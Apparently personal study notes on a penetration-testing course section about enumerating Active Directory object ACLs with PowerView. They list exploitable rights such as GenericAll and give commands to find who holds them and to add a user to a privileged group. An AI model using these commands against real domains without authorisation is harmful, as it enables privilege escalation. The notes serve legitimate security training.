# 22.3.4 — Enumerating Object Permissions (ACLs)

- Module: PEN-200 · 22. Active Directory Introduction and Enumeration
- Source: portal.offsec.com · module `active-directory-introduction-and-enumeration-45847` (§22.3.4)
- Code blocks: 6

> Every AD object has an **ACL** made of **ACEs** (allow/deny entries). Weak ACEs on high-value
> objects are a top privilege-escalation vector. Output omitted.

## Interesting rights (attacker's shortlist)

| Right | What it grants |
|---|---|
| **GenericAll** | Full control over the object (most powerful) |
| **GenericWrite** | Edit certain attributes |
| **WriteOwner** | Take ownership of the object |
| **WriteDACL** | Edit the ACEs on the object |
| **AllExtendedRights** | Change/reset password, etc. |
| **ForceChangePassword** | Reset the object's password |
| **Self (Self-Membership)** | Add ourselves to (e.g.) a group |

## Enumerate ACEs with PowerView

```powershell
Get-ObjectAcl -Identity {{USERNAME}}
```

> Two fields matter: **ActiveDirectoryRights** (the permission) and **SecurityIdentifier** (who
> holds it). `ObjectSID` is the object being enumerated.

## Convert SIDs to names

```powershell
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
```

## Find who has GenericAll over a target, then resolve them

```powershell
Get-ObjectAcl -Identity "{{GROUP_NAME}}" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

```powershell
"S-1-5-...-512","S-1-5-...-1104","S-1-5-32-548" | Convert-SidToName
```

> In the lab, `{{USERNAME}}` (stephanie) unexpectedly holds **GenericAll** over the *Management
> Department* group — a misconfiguration, since a regular user shouldn't. That makes her a
> powerful account.

## Abuse GenericAll → add self to the group (and clean up)

```cmd
net group "{{GROUP_NAME}}" {{USERNAME}} /add /domain
```

```cmd
net group "{{GROUP_NAME}}" {{USERNAME}} /del /domain
```

```powershell
Get-NetGroup "{{GROUP_NAME}}" | select member
```

> Verify membership with `Get-NetGroup` before and after. **Always clean up** artifacts you create
> (remove yourself from the group). Deeper ACL-abuse tradecraft is in
> [[../htbad/20-acl-enumeration]] and [[../htbad/21-acl-abuse-tactics]].
